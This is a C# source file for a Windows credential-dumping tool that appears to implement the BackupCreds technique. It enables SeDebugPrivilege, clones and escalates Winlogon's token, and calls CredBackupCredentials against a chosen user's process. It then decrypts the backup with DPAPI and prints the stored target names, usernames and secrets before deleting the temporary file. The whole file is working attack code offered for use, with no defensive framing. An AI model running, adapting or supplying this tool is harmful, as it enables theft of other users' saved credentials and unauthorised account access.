using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
// Explicitly add this directive to expose the ProtectedData class
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using Microsoft.Win32.SafeHandles;

namespace A04_2_OS_cred_extract
{
    public static class Program
    {
        #region "Constants & Enumerations"
        private const uint STANDARD_RIGHTS_REQUIRED = 0x000F0000;
        private const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
        private const uint TOKEN_DUPLICATE = 0x0002;
        private const uint TOKEN_IMPERSONATE = 0x0004;
        private const uint TOKEN_QUERY = 0x0008;
        private const uint TOKEN_QUERY_SOURCE = 0x0010;
        private const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        private const uint TOKEN_ADJUST_GROUPS = 0x0040;
        private const uint TOKEN_ADJUST_DEFAULT = 0x0080;
        private const uint TOKEN_ADJUST_SESSIONID = 0x0100;

        private static readonly uint TOKEN_ALL_ACCESS = STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
                                                        TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
                                                        TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
                                                        TOKEN_ADJUST_SESSIONID;

        private const uint SePrivilegeEnabled = 0x00000002;

        [StructLayout(LayoutKind.Sequential)]
        public struct TokenPrivileges
        {
            public uint PrivilegeCount;
            public LUID Luid;
            public uint Attributes;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        public enum TOKEN_TYPE
        {
            TokenPrimary = 1,
            TokenImpersonation
        }

        public enum SECURITY_IMPERSONATION_LEVEL
        {
            SecurityAnonymous = 0,
            SecurityIdentification = 1,
            SecurityImpersonation = 2,
            SecurityDelegation = 3
        }

        public enum ProcessAccessFlags : uint
        {
            PROCESS_ALL_ACCESS = 0x1f0fff,
            PROCESS_TERMINATE = 0x1,
            PROCESS_CREATE_THREAD = 0x2,
            PROCESS_VM_OPERATION = 0x8,
            PROCESS_VM_READ = 0x10,
            PROCESS_VM_WRITE = 0x20,
            PROCESS_DUP_HANDLE = 0x40,
            PROCESS_SET_INFORMATION = 0x200,
            PROCESS_SET_QUOTA = 0x100,
            PROCESS_QUERY_INFORMATION = 0x400,
            PROCESS_QUERY_LIMITED_INFORMATION = 0x1000,
            SYNCHRONIZE = 0x100000,
            PROCESS_CREATE_PROCESS = 0x80,
            PROCESS_SUSPEND_RESUME = 0x800
        }

        [Flags]
        public enum IsTextUnicodeFlags
        {
            IS_TEXT_UNICODE_ASCII16 = 0x0001,
            IS_TEXT_UNICODE_REVERSE_ASCII16 = 0x0010,
            IS_TEXT_UNICODE_STATISTICS = 0x0002,
            IS_TEXT_UNICODE_REVERSE_STATISTICS = 0x0020,
            IS_TEXT_UNICODE_CONTROLS = 0x0004,
            IS_TEXT_UNICODE_REVERSE_CONTROLS = 0x0040,
            IS_TEXT_UNICODE_SIGNATURE = 0x0008,
            IS_TEXT_UNICODE_REVERSE_SIGNATURE = 0x0080,
            IS_TEXT_UNICODE_ILLEGAL_CHARS = 0x0100,
            IS_TEXT_UNICODE_ODD_LENGTH = 0x0200,
            IS_TEXT_UNICODE_DBCS_LEADBYTE = 0x0400,
            IS_TEXT_UNICODE_NULL_BYTES = 0x1000,
            IS_TEXT_UNICODE_UNICODE_MASK = 0x000F,
            IS_TEXT_UNICODE_REVERSE_MASK = 0x00F0,
            IS_TEXT_UNICODE_NOT_UNICODE_MASK = 0x0F00,
            IS_TEXT_UNICODE_NOT_ASCII_MASK = 0xF000
        }

        public struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }
        #endregion

        #region "Native API P/Invokes"
        [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
        public static extern bool LookupPrivilegeValue(string? systemName, string privilegeName, out LUID luid);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, [MarshalAs(UnmanagedType.Bool)] bool DisableAllPrivileges, ref TokenPrivileges NewState, int len, IntPtr prev, IntPtr relen);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool OpenProcessToken(IntPtr processHandle, uint desiredAccess, out IntPtr tokenHandle);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool DuplicateTokenEx(
            IntPtr hExistingToken,
            uint dwDesiredAccess,
            ref SECURITY_ATTRIBUTES lpTokenAttributes,
            SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
            TOKEN_TYPE TokenType,
            out IntPtr phNewToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern bool CredBackupCredentials(IntPtr Token, string FilePath, IntPtr Key, int KeySize, int KeyEncoded);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool RevertToSelf();

        [DllImport("advapi32.dll", SetLastError = false)]
        public static extern bool IsTextUnicode(byte[] buf, int len, ref IsTextUnicodeFlags opt);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hHandle);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();
        #endregion

        #region "Core Operational Logic"
        private static List<ArraySegment<byte>> Split(byte[] arr)
        {
            var result = new List<ArraySegment<byte>>();
            var offset = 0;
            var blobsize = 0;
            try
            {
                do
                {
                    offset += blobsize;
                    var delimeter = BitConverter.ToInt32(arr, offset);
                    if (delimeter != 48)
                    {
                        offset += 1;
                    }
                    blobsize = BitConverter.ToInt32(arr, offset + 4);
                    result.Add(new ArraySegment<byte>(arr, offset, blobsize));
                } while (offset + blobsize < arr.Length);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Exception happened in parsing of blob. Please report it! Exception was {ex}\n");
                Console.WriteLine("[!] Returning partial results ***********");
                return result;
            }

            return result;
        }

        public static bool EnableDebugPrivilege()
        {
            var hproc = GetCurrentProcess();
            if (!OpenProcessToken(hproc, 0x0020 | 0x0008, out var htok))
            {
                Console.WriteLine("[*] OpenProcessToken failed trying to enable SeDebugPrivilege");
                return false;
            }
            TokenPrivileges tkpPrivileges;
            tkpPrivileges.PrivilegeCount = 1;
            tkpPrivileges.Attributes = SePrivilegeEnabled;
            LookupPrivilegeValue(null, "SeDebugPrivilege", out tkpPrivileges.Luid);
            AdjustTokenPrivileges(htok, false, ref tkpPrivileges, 0, IntPtr.Zero, IntPtr.Zero);
            Console.WriteLine("[*] SeDebugPrivilege enabled");
            CloseHandle(htok);
            return true;
        }

        public static bool IsUnicode(byte[] bytes)
        {
            var flags = IsTextUnicodeFlags.IS_TEXT_UNICODE_STATISTICS;
            return IsTextUnicode(bytes, bytes.Length, ref flags);
        }

        public static void ParseDecCredBlob(byte[]? decBlobBytes, int offset)
        {
            if (decBlobBytes == null) return;
            try
            {
                var credFlags = BitConverter.ToUInt32(decBlobBytes, offset);
                offset += 4;
                var credSize = BitConverter.ToUInt32(decBlobBytes, offset);
                offset += 4;
                var credUnk0 = BitConverter.ToUInt32(decBlobBytes, offset);
                offset += 4;
                var type = BitConverter.ToUInt32(decBlobBytes, offset);
                offset += 4;
                var flags = BitConverter.ToUInt32(decBlobBytes, offset);
                offset += 4;

                var lastWritten = BitConverter.ToInt64(decBlobBytes, offset);
                offset += 8;
                var unkFlagsOrSize = BitConverter.ToUInt32(decBlobBytes, offset);
                offset += 4;
                var persist = BitConverter.ToUInt32(decBlobBytes, offset);
                offset += 4;
                var attributeCount = BitConverter.ToUInt32(decBlobBytes, offset);
                offset += 4;
                var unk0 = BitConverter.ToUInt32(decBlobBytes, offset);
                offset += 4;
                var unk1 = BitConverter.ToUInt32(decBlobBytes, offset);
                offset += 4;

                var targetNameLen = BitConverter.ToInt32(decBlobBytes, offset);
                offset += 4;
                var targetName = Encoding.Unicode.GetString(decBlobBytes, offset, targetNameLen);
                offset += targetNameLen;
                Console.WriteLine($"    TargetName       : {targetName.Trim()}");

                var targetAliasLen = BitConverter.ToInt32(decBlobBytes, offset);
                offset += 4;
                var targetAlias = Encoding.Unicode.GetString(decBlobBytes, offset, targetAliasLen);
                offset += targetAliasLen;
                Console.WriteLine($"    TargetAlias      : {targetAlias.Trim()}");

                var commentLen = BitConverter.ToInt32(decBlobBytes, offset);
                offset += 4;
                var comment = Encoding.Unicode.GetString(decBlobBytes, offset, commentLen);
                offset += commentLen;
                Console.WriteLine($"    Comment          : {comment.Trim()}");

                var unkDataLen = BitConverter.ToInt32(decBlobBytes, offset);
                offset += 4;
                offset += unkDataLen; // Advance past unkData

                var userNameLen = BitConverter.ToInt32(decBlobBytes, offset);
                offset += 4;
                var userName = Encoding.Unicode.GetString(decBlobBytes, offset, userNameLen);
                offset += userNameLen;
                Console.WriteLine($"    UserName         : {userName.Trim()}");

                var credBlobLen = BitConverter.ToInt32(decBlobBytes, offset);
                offset += 4;
                var credBlobBytes = new byte[credBlobLen];
                Array.Copy(decBlobBytes, offset, credBlobBytes, 0, credBlobLen);

                if (IsUnicode(credBlobBytes))
                {
                    var credBlob = Encoding.Unicode.GetString(credBlobBytes);
                    Console.WriteLine($"    Credential       : {credBlob.Trim()}");
                }
                else
                {
                    var credBlobByteString = BitConverter.ToString(credBlobBytes).Replace("-", " ");
                    Console.WriteLine($"    Credential       : {credBlobByteString.Trim()}");
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                throw;
            }
        }

        public static void Main(string[] args)
        {
            if (args.Length != 2)
            {
                Help();
            }
            else
            {
                try
                {
                    DoDump(int.Parse(args[0]), args[1]);
                }
                catch (Exception e)
                {
                    Console.WriteLine($"[!] Something went terribly wrong: {e}");
                }
            }
        }

        private static void Help()
        {
            Console.WriteLine("BackupCreds [PID of target user process] [path to save temporary backup file]");
        }

        private static void DoDump(int targetProcess, string path)
        {
            try
            {
                EnableDebugPrivilege();
                var processesByName = Process.GetProcessesByName("winlogon");

                using (Process userProcess = Process.GetProcessById(targetProcess))
                {
                    Console.WriteLine($"[*] Targeting process with PID {userProcess.Id} which runs under session: {userProcess.SessionId}");

                    Process? winlogon = null;
                    foreach (var p in processesByName)
                    {
                        if (p.SessionId != userProcess.SessionId)
                        {
                            p.Dispose();
                            continue;
                        }
                        winlogon = p;
                        Console.WriteLine($"[*] Found Winlogon process with PID {winlogon.Id} matching session id: {p.SessionId}");
                    }

                    if (winlogon != null)
                    {
                        Console.WriteLine($"[*] Opening Winlogon with PID {winlogon.Id}");
                        var hProcess = OpenProcess(ProcessAccessFlags.PROCESS_QUERY_LIMITED_INFORMATION, false, winlogon.Id);
                        if (hProcess != IntPtr.Zero)
                        {
                            Console.WriteLine($"[*] Cloning token of Winlogon with PID {winlogon.Id}");
                            if (OpenProcessToken(hProcess, TOKEN_DUPLICATE, out var winLogonToken))
                            {
                                var sa = new SECURITY_ATTRIBUTES();
                                if (DuplicateTokenEx(winLogonToken, TOKEN_ALL_ACCESS, ref sa, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, out var hDupToken))
                                {
                                    if (!LookupPrivilegeValue(null, "SeTrustedCredManAccessPrivilege", out var luidSeTrustedCredManAccessPrivilege))
                                    {
                                        Console.WriteLine($"[!] LookupPrivilegeValue() failed, error = {Marshal.GetLastWin32Error()} SeTrustedCredManAccessPrivilege is not available");
                                        CloseAllHandles(hDupToken, hProcess, winLogonToken);
                                        winlogon.Dispose();
                                        return;
                                    }

                                    TokenPrivileges tkpPrivileges;
                                    tkpPrivileges.PrivilegeCount = 1;
                                    tkpPrivileges.Luid = luidSeTrustedCredManAccessPrivilege;
                                    tkpPrivileges.Attributes = SePrivilegeEnabled;
                                    int buffLen = Marshal.SizeOf(tkpPrivileges);

                                    if (!AdjustTokenPrivileges(hDupToken, false, ref tkpPrivileges, buffLen, IntPtr.Zero, IntPtr.Zero))
                                    {
                                        Console.WriteLine($"[!] AdjustTokenPrivileges() failed, error = {Marshal.GetLastWin32Error()} SeTrustedCredManAccessPrivilege is not available");
                                        CloseAllHandles(hDupToken, hProcess, winLogonToken);
                                        winlogon.Dispose();
                                        return;
                                    }

                                    var procHandle = new SafeWaitHandle(userProcess.Handle, false);
                                    if (!OpenProcessToken(procHandle.DangerousGetHandle(), (uint)TokenAccessLevels.MaximumAllowed, out var userToken))
                                    {
                                        Console.WriteLine($"[!] OpenProcessToken of user process with PID {userProcess.Id} failed {Marshal.GetLastWin32Error()}");
                                        CloseAllHandles(hDupToken, hProcess, winLogonToken);
                                        winlogon.Dispose();
                                        return;
                                    }

                                    if (!ImpersonateLoggedOnUser(hDupToken))
                                    {
                                        Console.WriteLine($"[!] ImpersonateLoggedOnUser() failed, error = {Marshal.GetLastWin32Error()}");
                                        CloseAllHandles(hDupToken, hProcess, winLogonToken, userToken);
                                        winlogon.Dispose();
                                        return;
                                    }

                                    if (!CredBackupCredentials(userToken, path, IntPtr.Zero, 0, 0))
                                    {
                                        Console.WriteLine($"[!] CredBackupCredentials() returned false. Error: {Marshal.GetLastWin32Error()}");
                                        RevertToSelf();
                                        CloseAllHandles(hDupToken, hProcess, winLogonToken, userToken);
                                        winlogon.Dispose();
                                        return;
                                    }

                                    byte[] decBytes;
                                    if (File.Exists(path))
                                    {
                                        try
                                        {
                                            decBytes = System.Security.Cryptography.ProtectedData.Unprotect(
                                                        File.ReadAllBytes(path),
                                                        null,
                                                        System.Security.Cryptography.DataProtectionScope.CurrentUser
                                            );
                                            Console.WriteLine("[*] Incoming creds!!!");
                                            Console.WriteLine("");
                                        }
                                        catch (CryptographicException e)
                                        {
                                            Console.WriteLine($"[!] ProtectedData Unprotect failed. {e}");
                                            RevertToSelf();
                                            CloseAllHandles(hDupToken, hProcess, winLogonToken, userToken);
                                            winlogon.Dispose();
                                            return;
                                        }
                                    }
                                    else
                                    {
                                        Console.WriteLine("[!] No file has been written to the provided location");
                                        RevertToSelf();
                                        CloseAllHandles(hDupToken, hProcess, winLogonToken, userToken);
                                        winlogon.Dispose();
                                        return;
                                    }

                                    if (decBytes.Length != 0)
                                    {
                                        var newArray = new byte[decBytes.Length - 12];
                                        Buffer.BlockCopy(decBytes, 12, newArray, 0, newArray.Length);

                                        foreach (var element in Split(newArray))
                                        {
                                            ParseDecCredBlob(element.Array, element.Offset);
                                        }
                                    }

                                    Console.WriteLine("");
                                    Console.WriteLine($"[*] Deleting temporary file at {path}");
                                    File.Delete(path);
                                    Console.WriteLine("[*] Reverting to self");
                                    RevertToSelf();

                                    CloseAllHandles(hDupToken, hProcess, winLogonToken, userToken);
                                }
                                else
                                {
                                    Console.WriteLine("[!] Winlogon DuplicateToken failed!");
                                    CloseHandle(winLogonToken);
                                    CloseHandle(hProcess);
                                }
                            }
                            else
                            {
                                Console.WriteLine("[!] Winlogon OpenProcessToken failed!");
                                CloseHandle(hProcess);
                            }
                        }
                        else
                        {
                            Console.WriteLine($"[!] OpenProcess failed on process with PID {winlogon.Id}");
                        }
                        winlogon.Dispose();
                    }
                    else
                    {
                        Console.WriteLine("[!] Unable to find target Winlogon process");
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[!] Exception happened: {e}");
            }
        }

        private static void CloseAllHandles(IntPtr hDup, IntPtr hProc, IntPtr hWinLogon, IntPtr hUser = default)
        {
            if (hDup != IntPtr.Zero) CloseHandle(hDup);
            if (hProc != IntPtr.Zero) CloseHandle(hProc);
            if (hWinLogon != IntPtr.Zero) CloseHandle(hWinLogon);
            if (hUser != IntPtr.Zero) CloseHandle(hUser);
        }
        #endregion
    }
}